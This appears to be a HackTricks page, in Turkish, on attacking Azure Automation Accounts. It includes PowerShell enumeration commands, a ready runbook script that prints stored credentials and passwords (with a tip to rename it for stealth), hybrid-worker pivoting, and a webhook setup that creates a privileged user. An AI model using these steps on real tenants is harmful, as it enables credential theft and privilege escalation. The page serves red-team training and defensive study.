# Az - Otomasyon Hesabı

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[Belgelerden alınan bilgiye göre:](https://learn.microsoft.com/en-us/azure/automation/overview) Azure Automation, Azure ve Azure olmayan ortamlarınızda tutarlı yönetimi destekleyen bir bulut tabanlı otomasyon, işletim sistemi güncelleme ve yapılandırma hizmeti sunar. İşlem otomasyonu, yapılandırma yönetimi, güncelleme yönetimi, paylaşılan yetenekler ve heterojen özellikler içerir.

Bunlar, Azure'da "**zamanlanmış görevler**" gibi, **Azure ortamını yönetmek**, kontrol etmek ve yapılandırmak için şeyleri (işlemler veya hatta betikler) yürütmenize izin verecek.

### Çalışma Hesabı

**Çalışma Hesabı** kullanıldığında, kendinden imzalı bir sertifika ile Azure AD **uygulaması oluşturur**, bir **hizmet başlığı oluşturur** ve **mevcut abonelikte** hesap için **Katkıda Bulunan** rolünü atar (birçok ayrıcalık).\
Microsoft, Otomasyon Hesabı için bir **Yönetilen Kimlik** kullanmanızı önerir.

{% hint style="warning" %}
Bu, **30 Eylül 2023'te kaldırılacak ve Yönetilen Kimliklerle değiştirilecek.**
{% endhint %}

## Çalışma Kitapları ve İşler

**Çalışma Kitapları**, keyfi PowerShell kodunu **yürütmenizi sağlar**. Bu, **bağlı başlığın** izinlerini çalmak için bir saldırgan tarafından **kötüye kullanılabilir**.\
**Çalışma Kitapları** kodunda, kimlik bilgileri gibi **duyarlı bilgiler** de bulunabilir.

Eğer **işleri okuyabiliyorsanız**, yapın çünkü **çalışmanın çıktısını** içerir (potansiyel **duyarlı bilgiler**).

`Otomasyon Hesapları`'na gidin --> `<Otomasyon Hesabını Seçin>` --> `Çalışma Kitapları/İşler/Hibrit işçi grupları/İzleyici görevleri/kimlikler/değişkenler/sertifikalar/bağlantılar`

### Hibrit İşçi

Bir Çalışma Kitabı, bir **Azure içindeki bir konteynerde** veya bir **Hibrit İşçi**'de (Azure olmayan makine) çalıştırılabilir.\
**Log Analytics Ajanı**, makineyi hibrit bir işçi olarak kaydetmek için VM'ye dağıtılır.\
Hibrit işçi işleri Windows'ta **SİSTEM** olarak ve Linux'ta **nxautomation** hesabı olarak çalışır.\
Her Hibrit İşçi, bir **Hibrit İşçi Grubuna** kaydedilir.

Bu nedenle, bir **Windows Hibrit İşçisinde** bir **Çalışma Kitabı** çalıştırmayı seçebilirseniz, harici bir makinede **Sistem** olarak keyfi komutlar yürütürsünüz (güzel bir pivot tekniği).

## Durum Yapılandırma (SC) Kompromis

[Belgelerden alınan bilgiye göre:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) Azure Automation **Durum Yapılandırması**, bulutta veya yerindeki herhangi bir düğüm için PowerShell Desired State Configuration (DSC) [yapılandırmalarını](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) yazmanıza, yönetmenize ve derlemenize olanak tanıyan bir Azure yapılandırma yönetimi hizmetidir. Hizmet ayrıca [DSC Kaynakları](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources)'nı içe aktarır ve hedef düğümlere yapılandırmalar atar, hepsi bulutta. Azure Automation Durum Yapılandırmasına, Azure portalında **Yapılandırma Yönetimi** altında **Durum yapılandırması (DSC)** seçerek erişebilirsiniz.

Bu yapılandırmalarda **duyarlı bilgiler** bulunabilir.

### Uzaktan Kod Çalıştırma (RCE)

SC'nin yönetilen makinelerde keyfi betikler çalıştırmak için kötüye kullanılması mümkündür.

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## Numaralandırma

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
{% endcode %}

### Bir Çalıştırma Kitabı Oluşturun

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### Bir Çalışma Kitabı kullanarak bir Otomasyon Hesabında tanımlanan Kimlik Bilgilerini ve Değişkenleri dışa aktarın

{% code overflow="wrap" %}
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
Aynı şeyi mevcut bir Çalıştırma Kitabını değiştirerek ve web konsolundan da yapabilirsiniz.
{% endhint %}

### Otomatik Yüksek Yetkili Kullanıcı Oluşturma Kurulum Adımları

#### 1. Bir Otomasyon Hesabı Başlatın
- **Gerekli Eylem:** Yeni bir Otomasyon Hesabı oluşturun.
- **Belirli Ayar:** "Azure Run As hesabı oluştur" seçeneğinin etkin olduğundan emin olun.

#### 2. Çalıştırma Kitabını İçe Aktarın ve Kurun
- **Kaynak:** Örnek çalıştırma kitabını [MicroBurst GitHub Deposu'ndan](https://github.com/NetSPI/MicroBurst) indirin.
- **Gerekli Eylemler:**
- Çalıştırma kitabını Otomasyon Hesabına içe aktarın.
- Çalıştırma kitabını yürütülebilir hale getirmek için yayınlayın.
- Dış tetiklemeleri etkinleştirmek için çalıştırma kitabına bir webhook ekleyin.

#### 3. AzureAD Modülünü Yapılandırın
- **Gerekli Eylem:** AzureAD modülünü Otomasyon Hesabına ekleyin.
- **Ek Adım:** Tüm Azure Otomasyon Modüllerinin en son sürümlerine güncellendiğinden emin olun.

#### 4. İzin Ataması
- **Atanacak Roller:**
- Kullanıcı Yöneticisi
- Abonelik Sahibi
- **Hedef:** Bu rolleri gerekli yetkiler için Otomasyon Hesabına atayın.

#### 5. Potansiyel Erişim Kaybı Farkındalığı
- **Not:** Bu tür otomasyonları yapılandırmak, abonelik üzerinde kontrolü kaybetmenize neden olabileceğini unutmayın.

#### 6. Kullanıcı Oluşturmayı Tetikleyin
- Yeni bir kullanıcı oluşturmak için webhook'u tetikleyin ve bir POST isteği gönderin.
- Sağlanan PowerShell betiğini kullanarak, `$uri`'yi gerçek webhook URL'nizle değiştirerek ve `$AccountInfo`'yu istenen kullanıcı adı ve şifreyle güncelleyerek.
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## Referanslar

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Red Team Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Red Team Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
